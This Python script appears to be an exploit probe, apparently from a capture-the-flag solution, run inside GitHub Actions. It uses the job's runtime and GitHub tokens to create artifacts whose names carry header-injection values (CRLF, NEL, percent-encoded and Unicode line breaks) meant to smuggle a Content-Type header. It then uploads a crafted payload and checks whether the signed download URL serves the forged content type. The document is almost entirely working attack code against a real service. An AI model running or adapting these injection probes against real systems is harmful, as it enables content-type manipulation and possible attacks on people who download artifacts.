import os,uuid,urllib.request,urllib.error,urllib.parse
import solve
run_id,job_id=solve.backend_ids(os.environ['ACTIONS_RUNTIME_TOKEN'])
common={'workflow_run_backend_id':run_id,'workflow_job_run_backend_id':job_id}
repo=os.environ['GITHUB_REPOSITORY']; secret=os.environ['GITHUB_TOKEN']
class Stop(urllib.request.HTTPRedirectHandler):
 def redirect_request(self,*args): return None
opener=urllib.request.build_opener(Stop)
cases=[
 ('crlf_ct','\r\nContent-Type: \x85application/json'),
 ('lf_ct','\nContent-Type: \x85application/json'),
 ('cr_ct','\rContent-Type: \x85application/json'),
 ('nel_ct','\x85Content-Type: \x85application/json'),
 ('pct_crlf','%0D%0AContent-Type%3A%20%85application%2Fjson'),
 ('unicode_ls','\u2028Content-Type: \x85application/json'),
 ('us_ct','\x1fContent-Type: \x85application/json'),
]
for version in (7,6):
 for label,suffix in cases:
  name='probe-'+uuid.uuid4().hex[:8]+suffix+'.json'
  request={**common,'name':name,'version':version}
  if version>=7: request['mime_type']='application/json'
  try: created=solve.twirp('CreateArtifact',request)
  except urllib.error.HTTPError as e:
   print(version,label,'create_http',e.code,e.read(120),flush=True);continue
  except Exception as e:
   print(version,label,'create_error',repr(e),flush=True);continue
  try:
   url=created['signed_upload_url']; solve.put_blob(url,b'{}')
   final=solve.finalize_artifact(common,name,b'{}'); aid=str(final['artifact_id'])
   body=solve.payload(repo,aid);solve.put_blob(url,body)
   req=urllib.request.Request('https://api.github.com/repos/'+repo+'/actions/artifacts/'+aid+'/zip',headers={'Authorization':'Bearer '+secret})
   try: r=opener.open(req,timeout=15)
   except urllib.error.HTTPError as e:r=e
   location=r.headers.get('Location','')
   with urllib.request.urlopen(urllib.request.Request(location,method='HEAD'),timeout=15) as response:
    ct=response.headers.get('Content-Type')
   print(version,label,'id',aid,'ct',repr(ct),'rsct',repr(urllib.parse.parse_qs(urllib.parse.urlsplit(location).query).get('rsct')),'rscd',repr(urllib.parse.parse_qs(urllib.parse.urlsplit(location).query).get('rscd')),flush=True)
  except Exception as e:print(version,label,'later_error',repr(e),flush=True)
